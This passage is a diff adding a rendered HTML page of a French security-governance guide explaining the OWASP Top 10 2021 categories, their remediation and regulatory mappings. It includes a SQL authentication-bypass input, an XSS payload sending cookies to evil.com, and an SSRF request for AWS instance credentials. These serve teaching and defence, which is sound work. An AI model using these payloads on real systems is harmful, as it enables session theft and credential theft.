+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#les-10-categories-de-vulnerabilites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Les 10 catégories de vulnérabilités
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Les 10 catégories de vulnérabilités">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vue-densemble-2021" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vue d'ensemble 2021
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a012021-broken-access-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A01:2021 — Broken Access Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a022021-cryptographic-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A02:2021 — Cryptographic Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a032021-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A03:2021 — Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a042021-insecure-design" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A04:2021 — Insecure Design
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a052021-security-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A05:2021 — Security Misconfiguration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a062021-vulnerable-and-outdated-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A06:2021 — Vulnerable and Outdated Components
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a072021-identification-and-authentication-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A07:2021 — Identification and Authentication Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a082021-software-and-data-integrity-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A08:2021 — Software and Data Integrity Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a092021-security-logging-and-monitoring-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A09:2021 — Security Logging and Monitoring Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a102021-server-side-request-forgery-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A10:2021 — Server-Side Request Forgery (SSRF)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#owasp-top-10-et-la-chaine-grc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OWASP Top 10 et la chaîne GRC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OWASP Top 10 et la chaîne GRC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exigences-reglementaires-referencant-lowasp-top-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exigences réglementaires référençant l'OWASP Top 10
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#integration-dans-le-sdlc-securise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Intégration dans le SDLC sécurisé
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ecueils-a-eviter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Écueils à éviter
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ressources-complementaires" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ressources complémentaires
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Cyber : Gouvernance
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Gestion des vulnérabilités
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="vulnerabilites-web-owasp-top-10">Vulnérabilités Web — OWASP Top 10<a class="headerlink" href="#vulnerabilites-web-owasp-top-10" title="Permanent link">&para;</a></h1>
+<p><div
+  class="omny-meta"
+  data-level="🟢 Débutant & 🟡 Intermédiaire"
+  data-version="OWASP Top 10 2021"
+  data-time="35-40 minutes">
+</div>
+</p>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<div class="admonition quote">
+<p class="admonition-title">Analogie pédagogique</p>
+<p><em>Imaginez un <strong>rapport annuel des accidents de la route</strong> qui identifie les 10 causes d'accidents les plus fréquentes et les plus mortelles — vitesse excessive, non-respect des priorités, téléphone au volant. Ce rapport ne recense pas tous les accidents possibles : il identifie ceux qui causent le plus de victimes afin que les campagnes de prévention, les contrôles routiers et les formations des conducteurs se concentrent là où l'impact est maximal. <strong>L'OWASP Top 10 fonctionne exactement ainsi</strong> pour les applications web : il identifie les 10 catégories de vulnérabilités qui causent le plus de compromissions réelles, permettant aux développeurs, aux auditeurs et aux équipes sécurité de concentrer leurs efforts là où ils auront le plus d'impact.</em></p>
+</div>
+<p><strong>L'OWASP Top 10</strong> (<em>Open Web Application Security Project</em>) est le <strong>référentiel de référence mondial des vulnérabilités applicatives web les plus critiques</strong>. Publié et mis à jour par la fondation OWASP — organisation à but non lucratif — depuis 2003, il est révisé tous les 3 à 4 ans sur la base de données réelles de vulnérabilités collectées auprès d'organisations dans le monde entier.</p>
+<p>La version <strong>2021</strong> est la référence actuelle. Elle introduit trois nouvelles catégories par rapport à la version 2017 : <em>Insecure Design</em>, <em>Software and Data Integrity Failures</em>, et <em>Server-Side Request Forgery (SSRF)</em> — reflétant l'évolution du paysage des menaces applicatives.</p>
+<div class="admonition info">
+<p class="admonition-title">Pourquoi l'OWASP Top 10 est essentiel ?</p>
+<p>L'OWASP Top 10 est cité comme référentiel dans ISO 27002 (contrôle 8.28 — codage sécurisé), NIS2 (exigences de sécurité applicative) et DORA (sécurité du développement logiciel). C'est le langage commun entre les équipes de développement, les pentesters, les RSSI et les auditeurs pour parler des risques applicatifs. Ne pas le maîtriser, c'est ne pas maîtriser le vocabulaire de la sécurité applicative.</p>
+</div>
+<p><br></p>
+<hr />
+<h2 id="pour-repartir-des-bases">Pour repartir des bases<a class="headerlink" href="#pour-repartir-des-bases" title="Permanent link">&para;</a></h2>
+<h3 id="position-dans-la-gestion-des-vulnerabilites">Position dans la gestion des vulnérabilités<a class="headerlink" href="#position-dans-la-gestion-des-vulnerabilites" title="Permanent link">&para;</a></h3>
+<p>L'OWASP Top 10 se distingue des CVE/CVSS<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup> sur un point fondamental :</p>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>CVE/CVSS</th>
+<th>OWASP Top 10</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Périmètre</strong></td>
+<td>Vulnérabilités spécifiques dans des produits identifiés</td>
+<td>Catégories génériques de failles dans les applications web</td>
+</tr>
+<tr>
+<td><strong>Niveau</strong></td>
+<td>Vulnérabilité précise (ex : Log4Shell dans Log4j 2.x)</td>
+<td>Famille de vulnérabilités (ex : Injection)</td>
+</tr>
+<tr>
+<td><strong>Usage principal</strong></td>
+<td>Patch management, veille CVE</td>
+<td>Développement sécurisé, audit applicatif</td>
+</tr>
+<tr>
+<td><strong>Identifiant</strong></td>
+<td>CVE-ANNÉE-NUMÉRO</td>
+<td>A01:2021, A02:2021...</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Un CVE peut correspondre à une ou plusieurs catégories OWASP. Log4Shell (CVE-2021-44228) relève de <strong>A03:2021 Injection</strong>. Une faille XSS dans un CMS relève de <strong>A03:2021</strong> également.</p>
+</blockquote>
+<h3 id="relation-avec-iso-27002">Relation avec ISO 27002<a class="headerlink" href="#relation-avec-iso-27002" title="Permanent link">&para;</a></h3>
+<p>Le contrôle <strong>8.28 — Codage sécurisé</strong> d'ISO 27002:2022 mentionne explicitement l'OWASP Top 10 comme référentiel de bonnes pratiques pour le développement sécurisé. ISO 27001 ne liste pas de vulnérabilités spécifiques — l'OWASP Top 10 en est la déclinaison applicative opérationnelle.</p>
+<p><br></p>
+<hr />
+<h2 id="les-10-categories-de-vulnerabilites">Les 10 catégories de vulnérabilités<a class="headerlink" href="#les-10-categories-de-vulnerabilites" title="Permanent link">&para;</a></h2>
+<h3 id="vue-densemble-2021">Vue d'ensemble 2021<a class="headerlink" href="#vue-densemble-2021" title="Permanent link">&para;</a></h3>
+<pre class="mermaid"><code>---
+config:
+  theme: "base"
+---
+flowchart TD
+    A01["A01:2021\nBroken Access Control\n⬆ De A5 à A1"] --&gt; A02["A02:2021\nCryptographic Failures\n⬆ De A3 à A2"]
+    A02 --&gt; A03["A03:2021\nInjection\n⬇ De A1 à A3\n(inclut XSS)"]
+    A03 --&gt; A04["A04:2021\nInsecure Design\n🆕 Nouveau"]
+    A04 --&gt; A05["A05:2021\nSecurity Misconfiguration\n⬆ De A6 à A5"]
+    A05 --&gt; A06["A06:2021\nVulnerable Components\n⬆ De A9 à A6"]
+    A06 --&gt; A07["A07:2021\nIdentification &amp; Auth. Failures\n⬇ De A2 à A7"]
+    A07 --&gt; A08["A08:2021\nSoftware &amp; Data Integrity Failures\n🆕 Nouveau (inclut CI/CD)"]
+    A08 --&gt; A09["A09:2021\nLogging &amp; Monitoring Failures\n⬇ De A10 à A9"]
+    A09 --&gt; A10["A10:2021\nSSRF\n🆕 Nouveau"]</code></pre>
+<p><br></p>
+<h3 id="a012021-broken-access-control">A01:2021 — Broken Access Control<a class="headerlink" href="#a012021-broken-access-control" title="Permanent link">&para;</a></h3>
+<p><strong>Contrôle d'accès défaillant</strong></p>
+<p><strong>Description :</strong><br />
+Un contrôle d'accès défaillant survient quand une application n'applique pas correctement les restrictions sur ce que les utilisateurs authentifiés sont autorisés à faire. Le résultat : des utilisateurs accèdent à des fonctionnalités ou des données auxquelles ils n'ont pas le droit.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Modifier l'ID dans l'URL <code>/facture?id=12345</code> → accéder à la facture <code>id=12346</code> appartenant à un autre client (IDOR<sup id="fnref:2"><a class="footnote-ref" href="#fn:2">2</a></sup>)</li>
+<li>Un utilisateur standard accède à <code>/admin/users</code> simplement en tapant l'URL</li>
+<li>API REST retournant des données sensibles d'autres utilisateurs sans vérifier les autorisations</li>
+<li>Escalade de privilèges : un utilisateur modifie son rôle de <code>user</code> à <code>admin</code> dans un paramètre POST</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- Principe du <strong>moindre privilège</strong> : par défaut, tout accès est refusé
+- <strong>Contrôles côté serveur</strong> : ne jamais se fier aux contrôles côté client
+- <strong>Journalisation</strong> des échecs de contrôle d'accès
+- <strong>Tests d'autorisation</strong> systématiques dans les revues de code</p>
+<hr />
+<h3 id="a022021-cryptographic-failures">A02:2021 — Cryptographic Failures<a class="headerlink" href="#a022021-cryptographic-failures" title="Permanent link">&para;</a></h3>
+<p><strong>Défaillances cryptographiques</strong></p>
+<p><strong>Description :</strong><br />
+Anciennement <em>Sensitive Data Exposure</em> (exposition des données sensibles), cette catégorie couvre les failles liées au chiffrement : chiffrement absent, algorithmes faibles, gestion incorrecte des clés, transmission de données sensibles en clair.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Données de carte bancaire stockées en clair dans la base de données</li>
+<li>Transmission de mots de passe en HTTP (non chiffré) sur le réseau</li>
+<li>Utilisation de MD5 ou SHA-1 pour hacher les mots de passe (algorithmes cassables)</li>
+<li>Clés de chiffrement stockées dans le code source ou des fichiers de configuration</li>
+<li>Certificats TLS expirés ou utilisant TLS 1.0/1.1 (protocoles obsolètes)</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Chiffrement en transit</strong> : TLS 1.2+ obligatoire pour toutes les communications
+- <strong>Chiffrement au repos</strong> : AES-256 pour les données sensibles
+- <strong>Hachage des mots de passe</strong> : bcrypt, Argon2, scrypt uniquement
+- <strong>Gestion des clés</strong> : vault dédié (HashiCorp Vault, AWS KMS) — jamais dans le code</p>
+<hr />
+<h3 id="a032021-injection">A03:2021 — Injection<a class="headerlink" href="#a032021-injection" title="Permanent link">&para;</a></h3>
+<p><strong>Injections</strong></p>
+<p><strong>Description :</strong><br />
+Les injections surviennent quand des données non fiables sont envoyées à un interpréteur (SQL, LDAP, OS, XML...) en tant que partie d'une commande ou d'une requête. L'attaquant peut ainsi exécuter des commandes non autorisées ou accéder à des données sans autorisation. Le XSS (Cross-Site Scripting) est intégré à cette catégorie depuis 2021.</p>
+<p><strong>Exemples concrets :</strong></p>
+<p><strong>Injection SQL :</strong>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">-- Requête vulnérable</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">login</span><span class="o">=</span><span class="s1">&#39;$login&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$password&#39;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1">-- Entrée malveillante : login = admin&#39;--</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1">-- Résultat : authentification bypassée</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">login</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39; AND password=&#39;...&#39;</span>
+</span></code></pre></div>
+<em>La portion après <code>--</code> est commentée : le mot de passe n'est plus vérifié.</em></p>
+<p><strong>Cross-Site Scripting (XSS) :</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cm">&lt;!-- Champ de commentaire qui affiche directement l&#39;entrée --&gt;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Votre commentaire : <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;https://evil.com/steal?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<em>Les cookies de session des visiteurs sont envoyés à l'attaquant.</em></p>
+<p><strong>Remédiation :</strong>
+- <strong>Requêtes paramétrées</strong> (<em>prepared statements</em>) pour toutes les interactions avec la base de données — jamais de concaténation de chaînes
+- <strong>Validation et assainissement</strong> des entrées utilisateur (whitelist, pas blacklist)
+- <strong>Échappement</strong> de toutes les données avant affichage dans le HTML (pour XSS)
+- <strong>WAF</strong> (Web Application Firewall) comme défense en profondeur</p>
+<hr />
+<h3 id="a042021-insecure-design">A04:2021 — Insecure Design<a class="headerlink" href="#a042021-insecure-design" title="Permanent link">&para;</a></h3>
+<p><strong>Conception non sécurisée</strong> <em>(Nouveauté 2021)</em></p>
+<p><strong>Description :</strong><br />
+Catégorie nouvelle qui distingue les failles de conception des failles d'implémentation. Un design non sécurisé ne peut pas être corrigé par un simple patch — il nécessite une refonte architecturale. Elle représente l'échec du principe <em>security by design</em>.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Flux de récupération de mot de passe reposant sur des "questions secrètes" (facilement devinables)</li>
+<li>Absence de limite du nombre de tentatives de connexion (pas de protection contre le bruteforce)</li>
+<li>Architecture qui permet à n'importe quel composant d'accéder directement à la base de données (pas de séparation des responsabilités)</li>
+<li>Logique métier permettant d'appliquer plusieurs fois un code promo sur une commande</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Modélisation des menaces</strong> (<em>threat modeling</em>) dès la phase de conception
+- <strong>Revue de sécurité de l'architecture</strong> avant développement
+- Intégration de <strong>principes de sécurité par conception</strong> : moindre privilège, défense en profondeur, fail secure</p>
+<hr />
+<h3 id="a052021-security-misconfiguration">A05:2021 — Security Misconfiguration<a class="headerlink" href="#a052021-security-misconfiguration" title="Permanent link">&para;</a></h3>
+<p><strong>Mauvaises configurations de sécurité</strong></p>
+<p><strong>Description :</strong><br />
+La misconfiguration est la catégorie la plus répandue. Elle couvre toutes les erreurs de configuration : paramètres par défaut non modifiés, services non nécessaires actifs, messages d'erreur révélateurs, répertoires exposés, permissions excessives.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Interface d'administration exposée sur Internet avec les identifiants par défaut (<code>admin/admin</code>)</li>
+<li>Pages d'erreur affichant des stack traces révélant la technologie et la version utilisée</li>
+<li>Compartiment S3 AWS configuré en accès public</li>
+<li>Headers de sécurité HTTP absents (Content-Security-Policy, X-Frame-Options, HSTS)</li>
+<li>Services inutilisés actifs (FTP, Telnet, ports ouverts non nécessaires)</li>
+<li>XML External Entity (XXE) — parseur XML mal configuré permettant des attaques</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Hardening systématique</strong> selon les CIS Benchmarks ou les recommandations ANSSI
+- <strong>Revue des configurations</strong> à chaque déploiement
+- <strong>Headers de sécurité</strong> HTTP configurés sur tous les serveurs web
+- <strong>Désactivation</strong> de tous les services, ports et fonctionnalités non utilisés
+- <strong>Séparation</strong> des environnements (dev, staging, production)</p>
+<hr />
+<h3 id="a062021-vulnerable-and-outdated-components">A06:2021 — Vulnerable and Outdated Components<a class="headerlink" href="#a062021-vulnerable-and-outdated-components" title="Permanent link">&para;</a></h3>
+<p><strong>Composants vulnérables et obsolètes</strong></p>
+<p><strong>Description :</strong><br />
+Utilisation de bibliothèques, frameworks, modules tiers contenant des vulnérabilités connues (CVE). C'est le domaine du <em>Software Supply Chain Security</em> et des SBOM<sup id="fnref:3"><a class="footnote-ref" href="#fn:3">3</a></sup>.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Log4Shell (CVE-2021-44228) : millions d'applications Java utilisaient Log4j sans mise à jour</li>
+<li>Struts2 (CVE-2017-5638) : exploité dans la compromission d'Equifax (145 millions de données)</li>
+<li>Utilisation de jQuery 1.x ou Angular 1.x non supportées avec des vulnérabilités connues</li>
+<li>Image Docker basée sur Ubuntu 20.04 sans mise à jour depuis 18 mois</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Inventaire des dépendances</strong> (SBOM) — lister toutes les bibliothèques utilisées et leurs versions
+- <strong>Veille CVE</strong> automatisée sur les composants utilisés (Dependabot, Snyk, OWASP Dependency-Check)
+- <strong>Politique de mise à jour</strong> : patch management incluant les dépendances applicatives
+- <strong>Images de base</strong> maintenues à jour dans les pipelines CI/CD</p>
+<hr />
+<h3 id="a072021-identification-and-authentication-failures">A07:2021 — Identification and Authentication Failures<a class="headerlink" href="#a072021-identification-and-authentication-failures" title="Permanent link">&para;</a></h3>
+<p><strong>Défaillances d'identification et d'authentification</strong></p>
+<p><strong>Description :</strong><br />
+Failles dans les mécanismes d'authentification permettant à des attaquants d'usurper des identités : mots de passe faibles acceptés, sessions mal gérées, absence de MFA sur les comptes sensibles.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Application acceptant des mots de passe comme <code>password</code>, <code>123456</code>, <code>admin</code></li>
+<li>Sessions non invalidées après déconnexion (token JWT<sup id="fnref:4"><a class="footnote-ref" href="#fn:4">4</a></sup> valide indéfiniment)</li>
+<li>URLs contenant des identifiants de session (exposés dans les logs)</li>
+<li>Absence de protection contre le credential stuffing (test automatisé de couples login/mot de passe issus de fuites)</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>MFA obligatoire</strong> pour tous les comptes à privilèges et les actions sensibles
+- <strong>Politique de mots de passe robuste</strong> : longueur minimum, vérification contre les listes de mots de passe compromis (Have I Been Pwned)
+- <strong>Invalidation des sessions</strong> à la déconnexion et expiration automatique
+- <strong>Rate limiting</strong> et lockout temporaire après N tentatives échouées</p>
+<hr />
+<h3 id="a082021-software-and-data-integrity-failures">A08:2021 — Software and Data Integrity Failures<a class="headerlink" href="#a082021-software-and-data-integrity-failures" title="Permanent link">&para;</a></h3>
+<p><strong>Défaillances d'intégrité des données et des logiciels</strong> <em>(Nouveauté 2021)</em></p>
+<p><strong>Description :</strong><br />
+Catégorie couvrant les failles liées à l'absence de vérification de l'intégrité des mises à jour logicielles, des données critiques et des pipelines CI/CD. Intègre également les attaques sur la supply chain logicielle.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Application téléchargeant des mises à jour sans vérifier leur signature cryptographique (attaque man-in-the-middle possible)</li>
+<li>Pipeline CI/CD compromis permettant d'injecter du code malveillant dans les builds de production</li>
+<li>Désérialisation<sup id="fnref:5"><a class="footnote-ref" href="#fn:5">5</a></sup> non sécurisée : un objet sérialisé fourni par l'utilisateur est désérialisé sans validation</li>
+<li>Attaque SolarWinds : build compromis, mises à jour légitimes contenant un backdoor</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Vérification des signatures</strong> de toutes les mises à jour et dépendances tierces
+- <strong>Sécurisation du pipeline CI/CD</strong> : accès restreints, audit des modifications, images de base signées
+- <strong>Jamais de désérialisation</strong> d'objets provenant de sources non fiables
+- <strong>Revue de sécurité</strong> des dépendances open source avant intégration</p>
+<hr />
+<h3 id="a092021-security-logging-and-monitoring-failures">A09:2021 — Security Logging and Monitoring Failures<a class="headerlink" href="#a092021-security-logging-and-monitoring-failures" title="Permanent link">&para;</a></h3>
+<p><strong>Insuffisances de la journalisation et de la surveillance</strong></p>
+<p><strong>Description :</strong><br />
+Sans journalisation et surveillance adéquates, les attaques ne sont pas détectées ou le sont trop tard. Cette catégorie couvre l'absence de logs, des logs insuffisants, des alertes non configurées, et l'absence de plan de réponse aux incidents.</p>
+<p><strong>Exemples concrets :</strong></p>
+<ul>
+<li>Tentatives de connexion échouées non journalisées → bruteforce indétectable</li>
+<li>Logs d'audit effaçables par les utilisateurs → altération des preuves</li>
+<li>Absence de SIEM ou d'alertes : une compromission découverte 200 jours après le début de l'attaque</li>
+<li>Aucun test de la procédure de réponse aux incidents</li>
+</ul>
+<p><strong>Remédiation :</strong>
+- <strong>Journalisation complète</strong> : authentifications (réussies et échouées), accès aux données sensibles, erreurs applicatives
+- <strong>SIEM</strong> centralisé avec corrélation des événements et alertes automatiques
+- <strong>Durée de rétention</strong> des logs adaptée (min. 1 an pour les logs de sécurité)
+- <strong>Protection des logs</strong> : stockage immuable, accès restreints, intégrité vérifiable
+- <strong>Tests de détection</strong> : vérifier que les alertes fonctionnent (simulation d'attaques)</p>
+<hr />
+<h3 id="a102021-server-side-request-forgery-ssrf">A10:2021 — Server-Side Request Forgery (SSRF)<a class="headerlink" href="#a102021-server-side-request-forgery-ssrf" title="Permanent link">&para;</a></h3>
+<p><strong>Falsification de requêtes côté serveur</strong> <em>(Nouveauté 2021)</em></p>
+<p><strong>Description :</strong><br />
+Le SSRF survient quand une application web effectue des requêtes HTTP vers des ressources désignées par l'utilisateur, sans valider correctement l'URL cible. L'attaquant peut ainsi amener le serveur à effectuer des requêtes vers des ressources internes inaccessibles depuis l'extérieur.</p>
+<p><strong>Exemples concrets :</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>-- Fonctionnalité légitime : récupérer une image depuis une URL
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>GET /api/fetch-image?url=https://example.com/image.jpg
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>-- Exploitation SSRF :
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>GET /api/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>-- Dans AWS, cette URL retourne les credentials IAM de l&#39;instance EC2
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>-- L&#39;attaquant obtient des clés d&#39;accès AWS depuis l&#39;extérieur
+</span></code></pre></div>
+<p><strong>Remédiation :</strong>
+- <strong>Validation stricte</strong> des URLs fournies par l'utilisateur (whitelist des domaines autorisés)
+- <strong>Désactivation</strong> des redirections HTTP automatiques
+- <strong>Segmentation réseau</strong> : le serveur applicatif ne doit pas accéder directement aux services internes sensibles
+- <strong>Filtrage</strong> des plages d'adresses internes (172.16.0.0/12, 10.0.0.0/8, 192.168.0.0/16) dans les requêtes sortantes</p>
+<p><br></p>
+<hr />
+<h2 id="owasp-top-10-et-la-chaine-grc">OWASP Top 10 et la chaîne GRC<a class="headerlink" href="#owasp-top-10-et-la-chaine-grc" title="Permanent link">&para;</a></h2>
+<h3 id="exigences-reglementaires-referencant-lowasp-top-10">Exigences réglementaires référençant l'OWASP Top 10<a class="headerlink" href="#exigences-reglementaires-referencant-lowasp-top-10" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Réglementation / Référentiel</th>
+<th>Article / Contrôle</th>
+<th>Référence à OWASP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>ISO 27002:2022</strong></td>
+<td>8.28 Codage sécurisé</td>
+<td>Mention explicite de l'OWASP Top 10</td>
+</tr>
+<tr>
+<td><strong>NIS2</strong></td>
+<td>Art. 21.2.e (sécurité développement)</td>
+<td>OWASP comme bonne pratique de référence</td>
+</tr>
+<tr>
+<td><strong>DORA</strong></td>
+<td>Art. 9 (mesures de sécurité applicatives)</td>
+<td>OWASP en référence sectorielle</td>
+</tr>
+<tr>
+<td><strong>PCI DSS v4</strong></td>
+<td>Exigence 6 (sécurité des systèmes)</td>
+<td>OWASP Top 10 obligatoirement couvert</td>
+</tr>
+<tr>
+<td><strong>ISO 27001 DdA</strong></td>
+<td>A.8.25-8.28</td>
+<td>OWASP comme guide d'implémentation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="integration-dans-le-sdlc-securise">Intégration dans le SDLC sécurisé<a class="headerlink" href="#integration-dans-le-sdlc-securise" title="Permanent link">&para;</a></h3>
+<pre class="mermaid"><code>---
+config:
+  theme: "base"
+---
+flowchart LR
+    REQ["Exigences\nThreat modeling\n(A04 Insecure Design)"] --&gt; DEV["Développement\nCodage sécurisé\n(A03 Injection\nA02 Crypto)"]
+    DEV --&gt; TEST["Tests\nSAST - DAST\nPentest\n(tous les A0x)"]
+    TEST --&gt; DEPLOY["Déploiement\nHardening\nConfiguration\n(A05 Misconfiguration)"]
+    DEPLOY --&gt; MONITOR["Surveillance\nSIEM - Logs\n(A09 Logging)"]
+    MONITOR -.Incidents.-&gt; REQ</code></pre>
+<p><br></p>
+<hr />
+<h2 id="ecueils-a-eviter">Écueils à éviter<a class="headerlink" href="#ecueils-a-eviter" title="Permanent link">&para;</a></h2>
+<div class="admonition warning">
+<p class="admonition-title">Pièges courants</p>
+<p><strong>Traiter l'OWASP Top 10 comme une checklist exhaustive :</strong><br />
+<em>L'OWASP Top 10 couvre les 10 catégories les plus critiques — pas toutes les vulnérabilités possibles. Des vulnérabilités importantes (clickjacking, CSRF, XXE) peuvent ne pas figurer dans le Top 10 tout en étant présentes dans votre application.</em></p>
+<p><strong>Confondre OWASP Top 10 et CVE :</strong><br />
+<em>L'OWASP Top 10 est un référentiel de catégories génériques. Il ne remplace pas la veille CVE sur les composants utilisés. Log4Shell est un CVE relevant de la catégorie A06 — vous devez patcher Log4j (CVE) ET avoir des pratiques de mise à jour des composants (A06).</em></p>
+<p><strong>Faire une revue OWASP Top 10 une fois par an :</strong><br />
